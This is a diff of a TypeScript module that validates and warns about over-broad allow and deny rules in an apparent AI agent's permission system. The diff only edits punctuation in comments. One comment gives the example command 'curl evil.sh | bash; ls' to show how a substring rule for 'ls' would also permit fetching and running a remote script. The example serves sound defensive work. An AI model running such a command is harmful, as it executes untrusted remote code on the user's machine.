@@ -3,7 +3,7 @@
 //
 // The dashboard and the CLI both create rules. They previously validated
 // differently: the HTTP handler bounded the pattern length, compiled it, and
-// capped the TTL, while the CLI checked only regex safety — so `--ttl-minutes
+// capped the TTL, while the CLI checked only regex safety, so `--ttl-minutes
 // 1e9` produced a rule expiring in the year 3900, and `--ttl-minutes abc`
 // crashed with `RangeError: Invalid time value` from deep inside Date. Two
 // front doors with different locks is the same as one unlocked door, and it
@@ -50,8 +50,8 @@ export function validateRulePattern(pattern: unknown): PatternValidation {
 /**
  * A rule that is valid but grants far more than it appears to.
  *
- * Non-blocking on purpose. These patterns are legitimate — an operator may
- * genuinely want to allow every command containing `ls` — so refusing them
+ * Non-blocking on purpose. These patterns are legitimate, an operator may
+ * genuinely want to allow every command containing `ls`, so refusing them
  * would be wrong. But the reason they are dangerous is that they *do not look*
  * dangerous, and a control whose failure mode is a confident misreading needs
  * to say so at the moment the mistake is made rather than in documentation
@@ -65,7 +65,7 @@ function isFullyAnchored(pattern: string): boolean {
 }
 
 /**
- * A pattern that is only wildcards between its anchors — `^.*$` and its
+ * A pattern that is only wildcards between its anchors, `^.*$` and its
  * spellings. Extracted to a named constant so the check and the warning text
  * cannot drift apart, and so it reads as a rule rather than as punctuation.
  */
@@ -79,7 +79,7 @@ const ONLY_WILDCARDS_BETWEEN_ANCHORS = /^\^[.*+()\\sSwWdD[\]{}|?]*\$$/;
  * each direction. A wide *allow* removes a protection; a wide *deny* removes a
  * capability. Both are worth saying and neither message is true of the other,
  * so the warnings are written twice rather than phrased vaguely enough to cover
- * both — a warning an operator has to translate is one they stop reading.
+ * both: a warning an operator has to translate is one they stop reading.
  */
 export type RuleIntent = {
   effect?: "allow" | "deny";
@@ -93,7 +93,7 @@ export type RuleIntent = {
  * **substring** search: `ls` does not mean "the command ls", it means "any
  * command containing ls anywhere", which includes
  * `curl evil.sh | bash; ls`. `WRITING-PERMISSIONS.md` explains this, and the
- * dashboard said nothing — so the one place the mistake is actually made was
+ * dashboard said nothing: so the one place the mistake is actually made was
  * the one place with no warning.
  */
 export function describeRuleRisks(
@@ -130,7 +130,7 @@ export function describeRuleRisks(
             code: "denies-everything",
             message:
               `This forbids every ${resourceKind} the agent could attempt, so it will ` +
-              `be unable to do anything of this kind at all — including work an ` +
+              `be unable to do anything of this kind at all, including work an ` +
               `existing allow rule permits, because denials are evaluated first. If ` +
               `you meant to restrict one thing, narrow the pattern.`,
           }
@@ -150,7 +150,7 @@ export function describeRuleRisks(
       code: "unanchored",
       message: denies
         ? `This is not anchored with ^ and $, so it matches anywhere inside the ` +
-          `${resourceKind} rather than describing the whole of it — a rule of "rm" ` +
+          `${resourceKind} rather than describing the whole of it. A rule of "rm" ` +
           `also forbids "confirm" and "format". Blocking more than intended is ` +
           `safer than blocking less, but it is still worth knowing. Write "^rm$" ` +
           `to forbid only that exact ${resourceKind}.`
@@ -196,7 +196,7 @@ export type TtlValidation = { ok: true; expiresAt?: string } | { ok: false; erro
  * fallback. Anything present must be a finite positive number: a non-numeric
  * value is rejected rather than silently becoming NaN, because `new
  * Date(NaN).toISOString()` throws, and a NaN that reached storage would
- * serialize to null and read back as "never expires" — a temporary grant
+ * serialize to null and read back as "never expires". A temporary grant
  * quietly promoted to a permanent one.
  */
 export function resolveRuleTtl(ttlMinutes: unknown): TtlValidation {
